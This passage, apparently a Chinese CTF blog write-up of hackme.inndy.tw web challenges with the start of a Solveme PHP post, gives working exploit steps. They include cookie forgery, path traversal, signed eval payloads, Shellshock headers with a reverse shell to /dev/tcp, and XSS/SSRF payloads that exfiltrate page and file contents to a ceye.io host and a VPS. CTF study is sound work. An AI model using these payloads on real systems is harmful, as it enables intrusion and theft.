'name' =&gt; $data[0], 'admin' =&gt; $data[1] ];&#125; 我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证 那么我们构造一个cookie 123456789101112&lt;?php function set_user()&#123; global $user, $secret; $user = ['admin', true]; $data = json_encode($user); $sig = 0; $all = base64_encode(json_encode(['sig' =&gt; $sig, 'data' =&gt; $data])); return $all;&#125;echo set_user();?&gt; 然后刷新即可 login as admin 4题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可 1curl -d \"name=admin\" https://hackme.inndy.tw/login4/ Login as Admin 61234567891011if(!empty($_POST['data'])) &#123; try &#123; $data = json_decode($_POST['data'], true); &#125; catch (Exception $e) &#123; $data = []; &#125; extract($data); if($users[$username] &amp;&amp; strcmp($users[$username], $password) == 0) &#123; $user = $username; &#125;&#125; 看代码可知存在变量覆盖漏洞，构造json数据即可 1data=&#123;\"users\":&#123;\"admin\":\"snow\"&#125;,\"username\":\"admin\",\"password\":\"snow\"&#125; login as admin 7md5弱比较 dafuq-manager 1查看cookie可以发现 show_hidden 字段为 no，改为yes刷新即可得到flag dafuq-manager 2这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag 推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分 1234case \"admin\": require \"./core/fun_admin.php\"; show_admin($GLOBALS[\"dir\"]); break; 我们跟进fun_admin.php 1234567891011121314151617181920212223242526272829function show_admin($dir) &#123; $pwd = (($GLOBALS[\"permissions\"] &amp; 2) == 2); $admin = (($GLOBALS[\"permissions\"] &amp; 4) == 4); if (!$GLOBALS[\"require_login\"]) show_error($GLOBALS[\"error_msg\"][\"miscnofunc\"]); if (isset($GLOBALS['__GET'][\"action2\"])) $action2 = $GLOBALS['__GET'][\"action2\"]; elseif (isset($GLOBALS['__POST'][\"action2\"])) $action2 = $GLOBALS['__POST'][\"action2\"]; else $action2 = \"\"; switch ($action2) &#123; case \"chpwd\": if (!$pwd) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); changepwd($dir); break; case \"adduser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); adduser($dir); break; case \"edituser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); edituser($dir); break; case \"rmuser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); removeuser($dir); break; default: if (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); admin($admin, $dir); &#125;&#125; 主要的限制条件在于 12$pwd = (($GLOBALS[\"permissions\"] &amp; 2) == 2);$admin = (($GLOBALS[\"permissions\"] &amp; 4) == 4); 我们跟进这个变量看一下 123456789101112function activate_user($user, $pass) &#123; $data = find_user($user, $pass); if ($data == NULL) return false; $GLOBALS['__SESSION'][\"s_user\"] = $data[0]; $GLOBALS['__SESSION'][\"s_pass\"] = $data[1]; $GLOBALS[\"home_dir\"] = $data[2]; $GLOBALS[\"home_url\"] = $data[3]; $GLOBALS[\"show_hidden\"] = $data[4]; $GLOBALS[\"no_access\"] = $data[5]; $GLOBALS[\"permissions\"] = $data[6]; return true;&#125; 再定位到find_user() 1234567891011function &amp;find_user($user, $pass) &#123; $cnt = count($GLOBALS[\"users\"]); for ($i = 0;$i &lt; $cnt;++$i) &#123; if ($user == $GLOBALS[\"users\"][$i][0]) &#123; if ($pass == NULL || ($pass == $GLOBALS[\"users\"][$i][1] &amp;&amp; $GLOBALS[\"users\"][$i][7])) &#123; return $GLOBALS[\"users\"][$i]; &#125; &#125; &#125; return NULL;&#125; 可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量 123$GLOBALS[\"users\"] = array( array(\"guest\", \"084e0343a0486ff05530df6c705c8bb4\", \"./data/guest\", \"https://game1.security.ntu.st/data/guest\", 0, \"^.ht\", 1, 1),); 但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数 在fun_down.php文件中可以找到一个readfile()函数 1234567891011121314151617181920212223242526&lt;?phprequire_once ('core/secure.php');function download_item($dir, $item) &#123; $item = basename($item); if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $abs_item = get_abs_item($dir, $item); if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $browser = id_browser(); header('Content-Type: ' . (($browser == 'IE' || $browser == 'OPERA') ? 'application/octetstream' : 'application/octet-stream')); header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT'); header('Content-Transfer-Encoding: binary'); header('Content-Length: ' . filesize($abs_item)); if ($browser == 'IE') &#123; header('Content-Disposition: attachment; filename=\"' . $item . '\"'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Pragma: public'); &#125; else &#123; header('Content-Disposition: attachment; filename=\"' . $item . '\"'); header('Cache-Control: no-cache, must-revalidate'); header('Pragma: no-cache'); &#125; @readfile($abs_item); exit;&#125; 题目过滤部分如下 12345if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $abs_item = get_abs_item($dir, $item); if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); 我们要读取的是 .config/.htusers.php ，但是在题目的 stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;) 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中 12345678910111213141516171819function edit_file($dir, $item) &#123; if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $fname = get_abs_item($dir, $item); if (!file_in_web($fname)) show_error($GLOBALS[\"error_msg\"][\"accessfile\"]); if (isset($GLOBALS['__POST'][\"dosave\"]) &amp;&amp; $GLOBALS['__POST'][\"dosave\"] == \"yes\") &#123; $item = basename(stripslashes($GLOBALS['__POST'][\"fname\"])); $fname2 = get_abs_item($dir, $item); if (!isset($item) || $item == \"\") show_error($GLOBALS[\"error_msg\"][\"miscnoname\"]); if ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"itemdoesexist\"]); savefile($dir, $fname2); $fname = $fname2; &#125; $fp = @fopen($fname, \"r\"); if ($fp === false) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"openfile\"]); $s_item = get_rel_item($dir, $item); if (strlen($s_item) &gt; 50) $s_item = \"...\" . substr($s_item, -47); show_header($GLOBALS[\"messages\"][\"actedit\"] . \": /\" . $s_item); 函数中有三条过滤 123if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); 第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下 123456789101112131415161718function get_show_item($dir, $item) &#123; if ($item == \".\" || $item == \"..\") return false; if ($_COOKIE['help'] == 'me') &#123; $_COOKIE['help'] = null; setcookie('help', '', time() - 9999999999); echo '&lt;script&gt;alert(\"Very good. You know how to create cookie. How about tamper a cookie?\")&lt;/script&gt;'; &#125; if (empty($_COOKIE['show_hidden'])) &#123; setcookie('show_hidden', 'no', time() + 3600); &#125; if (substr($item, 0, 1) == \".\" &amp;&amp; $GLOBALS[\"show_hidden\"] == false &amp;&amp; $_COOKIE['show_hidden'] != 'yes') return false; if ($GLOBALS[\"no_access\"] != \"\" &amp;&amp; @eregi($GLOBALS[\"no_access\"], $item)) return false; if ($GLOBALS[\"show_hidden\"] == false) &#123; $dirs = explode(\"/\", $dir); foreach ($dirs as $i) if (substr($i, 0, 1) == \".\") return false; &#125; return true;&#125; 题目仅仅对$item进行了简单的过滤， if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false; ，那么我们可以考虑用目录穿越 ../../ 绕过 那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes） 1https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=../../../../../var/www/webhdisk/.config/.htusers.php&amp;order=name&amp;srt=yes&amp;lang=en 于是可以读到目标文件 然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 how do you turn this on ，登录即可读取flag dafuq-manager 3题目给出了信息 For flag3, you need a shell to get that. see $WEBROOT/flag3! 这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 eval ，在fun_debug.php中发现存在该函数，跟进一下 1234567891011121314151617181920function do_debug() &#123; assert(strlen($GLOBALS['secret_key']) &gt; 40); $dir = $GLOBALS['__GET']['dir']; if (strcmp($dir, \"magically\") || strcmp($dir, \"hacker\") || strcmp($dir, \"admin\")) &#123; show_error('You are not hacky enough :('); &#125; list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2); $cmd = base64_decode($cmd); $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',); foreach ($bad_things as $bad) &#123; if (stristr($cmd, $bad)) &#123; die('2bad'); &#125; &#125; if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]), $hmac)) &#123; die(eval($cmd)); &#125; else &#123; show_error('What does the fox say?'); &#125;&#125; 对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数 1234function make_command($cmd) &#123; $hmac = hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]); return sprintf('%s.%s', base64_encode($cmd), $hmac);&#125; 所以我们可以自己生成command 1234567&lt;?php function make_command($cmd) &#123; $hmac = hash_hmac('sha256', $cmd, \"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3\"); return sprintf('%s.%s', base64_encode($cmd), $hmac);&#125;var_dump(make_command('$a=\\'sys\\';$b=\\'tem\\';$c=$a.$b;$c(base64_decode(\\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\\'));'));?&gt; 注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下 1https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&amp;dir[]=admin&amp;command=JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order=name&amp;srt=yes&amp;lang=en 做完后感觉自己好菜呀，这代码审计的我晕头转向，233333… wordpress 1WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 wp-content/plugins/core.php 中发现了一段代码 1234567891011function print_f14g()&#123; $h = 'm'.sprintf('%s%d','d',-4+9e0); if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') &#123; if(wp_get_user_ip() === '127.0.0.1') &#123; eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT))); &#125; else &#123; die('&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'); &#125; &#125;&#125; 我们把代码中的md5解密一下发现是 cat flag，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问 1https://wp.hackme.inndy.tw/?passw0rd=cat%20flag 查看元素即可找到flag wordpress 2随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句 1&lt;!-- debug:&lt;?php var_dump($wp_query-&gt;post-&gt;&#123;'post_'.(string)($_GET['debug']?:'type')&#125;); ?&gt; --&gt; 看到query，应该是在搜索页面，所以我们提交的payload应该为 1https://wp.hackme.inndy.tw/archives/date/2013/10?s=&amp;debug=content command-executor随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件 1https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index base64解码一下得到源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php$pages = [ ['man', 'Man'], ['untar', 'Tar Tester'], ['cmd', 'Cmd Exec'], ['ls', 'List files'],];function fuck($msg) &#123; header('Content-Type: text/plain'); echo $msg; exit;&#125;$black_list = [ '\\/flag', '\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;'];function waf($a) &#123; global $black_list; if(is_array($a)) &#123; foreach($a as $key =&gt; $val) &#123; waf($key); waf($val); &#125; &#125; else &#123; foreach($black_list as $b) &#123; if(preg_match(\"/$b/\", $a) === 1) &#123; fuck(\"$b detected! exit now.\"); &#125; &#125; &#125;&#125;waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell='bash') &#123; system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));&#125;foreach($_SERVER as $key =&gt; $val) &#123; if(substr($key, 0, 5) === 'HTTP_') &#123; putenv(\"$key=$val\"); &#125;&#125;$page = '';if(isset($_GET['func'])) &#123; $page = $_GET['func']; if(strstr($page, '..') !== false) &#123; $page = ''; &#125;&#125;if($page &amp;&amp; strlen($page) &gt; 0) &#123; try &#123; include(\"$page.php\"); &#125; catch (Exception $e) &#123; &#125;&#125;?&gt; 题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 CVE-2014-6271(破壳（shellsock）漏洞) ，在freebuf中有一个链接 http://www.freebuf.com/articles/system/45390.html 国外有一个漏洞利用的文章， https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php 但是直接利用会被waf掉，所以我们要考虑绕过正则 1&apos;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&apos; 题目的正则中 :; 是存在漏洞的，我们可以用 : ; 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 \\/flag 我们可以利用通配符绕过， 1wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/cat ../../../?lag-reader.c&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot; 但是并没有出现flag，发现是因为只有root才有文件的读权限 但是题目中有一个flag-reader文件，我们尝试读取一下 1wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/cat ../../../../../../?lag-reader.c&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot; 123456789101112131415161718192021222324252627282930313233include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char buff[4096], rnd[16], val[16]; if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123; write(1, \"Not enough random\\n\", 18); &#125; setuid(1337); seteuid(1337); alarm(1); write(1, &amp;rnd, sizeof(rnd)); read(0, &amp;val, sizeof(val)); if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123; int fd = open(argv[1], O_RDONLY); if(fd &gt; 0) &#123; int s = read(fd, buff, 1024); if(s &gt; 0) &#123; write(1, buff, s); &#125; close(fd); &#125; else &#123; write(1, \"Can not open file\\n\", 18); &#125; &#125; else &#123; write(1, \"Wrong response\\n\", 16); &#125;&#125; 代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell 1wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/your_vps_ip/8888 0&gt;&amp;1&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot; 又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag 1flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content 1cat content xssme先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下 1&lt;script&gt;alert(&apos;123&apos;)&lt;/script&gt; 回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做 然后在自己的ceve账号中收到回显 xssrf leak上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显 Admin only allowed from localhost, but you came from 192.168.123.1 修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法 1&lt;svg/onload=&quot;document.location=&apos;http://ov0eg5.ceye.io/?&apos;+btoa(document.body.innerHTML)&quot;&gt; 但是遭到了过滤，我们可以考虑用HTML实体编码绕过 1&lt;svg/onload=&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;&quot;&gt; 果然可以收到payload，base64解码一下再保存为html格式打开 send request功能有个request.php，尝试读取该页面 123456789101112&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; 编码一下 1&lt;svg/onload=&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;&quot;&gt; 然后在vps上即可收到base64字符串，解码 这应该就是题目的利用位置，我们尝试读config.php文件 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);&quot;&gt; 编码发送，果然可以收到flag xssrf redis题目漏洞点在于gopher未授权访问 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit&quot;);&quot;&gt; 发现有flag，读取之 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;); 然后处理一下即可得到flag","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"Solveme题解","slug":"solveme","date":"2018-07-31T01:59:41.000Z","updated":"2018-08-06T03:46:09.371Z","comments":true,"path":"2018/07/31/solveme/","link":"","permalink":"http://chaosec.top/2018/07/31/solveme/","excerpt":"前言最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下","text":"前言最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下 Warm up逆向跑一遍即可 1234&lt;?php $flag = '1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=';echo hex2bin(strrev(bin2hex(base64_decode($flag))));?&gt; Bad compare这个题目是字符串在不同编码下显示不同的问题，如果直接复制粘贴比较的会发生错误，办法是bp抓包查看16进制值提交上去就可以正确比较啦 Winter sleep利用PHP的数字解析漏洞，payload 1?time=6e6 Hard login这个题目想得到flag就是需要让username和passwd和它隐藏的相等，看到用户名只有三位猜测可能是考察爆破，但是没有爆破成功，到这儿就卡住了，最后看了一下学长博客，才知道这题要用到 curl，这个命令之前几乎没用过，算是一个新知识点，得学习一下了。不知道为什么直接在浏览器中访问index.php页面就不行，用curl命令就可以 1curl http://hardlogin.solveme.peng.kr/index.php URL filtering分析代码可知，代码大概思路是解析一下url(parse_url)，对于得到的字符串用&amp;分隔为数组，在对于每个数组值以等号分隔出key,value对，要求key中不能出现 do_you_want_flag,value中不能出现 yes，但是再获取flag时又要求必须是 do_you_want_flag=yes，显然是矛盾的，但是在翻看PHP手册查看parse_url函数时发现一句话 对严重不合格的 URL，parse_url() 可能会返回 FALSE。 所以猜测可能是这个parse函数存在突破点，搜索一下发现有个GeekPwn2016ctf比赛中就考过这个知识点，得到payload 1http://urlfiltering.solveme.peng.kr///?do_you_want_flag=yes Hash collision直接数组绕过 1?foo[]=1&amp;bar[]=2 Array2String题目核心在于提交 15th_HackingCamp对应的ascii码值，但是流程又限制数字不能在(32,127)之间，官网查找一下chr函数的描述可以看到如下描述 Note that if the number is higher than 256, it will return the number mod 256. 就是说如果数字大于256的话它会自动取模，所以就简单了 1http://array2string.solveme.peng.kr/index.php?password=simple_passw0rd&amp;value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368 Flag not foundGive me a link 21234567891011121314151617181920if(isset($_GET['url']))&#123; $url = $_GET['url'];if(preg_match('/_|\\s|\\0/', $url))&#123; die('Not allowed character');&#125;$parse = parse_url($url); if(!preg_match('/^https?$/i', $parse['scheme']))&#123; die('Not allowed scheme');&#125;if(!preg_match('/^(localhost|127\\.\\d+\\.\\d+\\.\\d+|[^.]+)(\\:\\d+)?$/i', $parse['host']))&#123; die('Not allowed host');&#125;if(!preg_match('/\\/plz_give_me$/', $parse['path']))&#123; die('Not allowed path');&#125;&#125; 分析代码，题目过滤了几个条件 1、 url中不能出现 _ 以及其他不可见字符2、 path字段中又必须出现 plz_give_me 字段3、 限制输入的网址必须是 localhost 或 127.x.x.x 这种类型的网址 1和2冲突，可以用前面一题的方法绕过之对于第三个，有个绕过方法就是 ip2long() 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤 所以最终payload为 1https://givemealink2.solveme.peng.kr/?url=https:num_ip:12580/plz%0agive%0ame Give me a link关键代码如下 1234567891011121314if(preg_match('/_|\\s|\\0/', $url))&#123; die('Not allowed character'); &#125; if(!preg_match('/^https?\\:\\/\\/'.$_SERVER['HTTP_HOST'].'/i', $url))&#123; die('Not allowed URL'); &#125; $parse = parse_url($url); if($parse['path'] !== '/plz_give_me')&#123; die('Not allowed path'); &#125; curl_setopt($ch, CURLOPT_URL, $parse['scheme'].'://'.$parse['host'].'/'.$flag); 第一个和第三个的条件矛盾，具体参见前文，其中 $_SERVER[&#39;HTTP_HOST&#39;] 又和 curl_setopt($ch, CURLOPT_URL, $parse[&#39;scheme&#39;].&#39;://&#39;.$parse[&#39;host&#39;].&#39;/&#39;.$flag); 矛盾，因为http_host内容找不不允许修改，但是查看PHP手册可知 $url = ‘http://username:password@hostname/path?arg=value#anchor‘; 这样的方式也可以解析url，所以构造 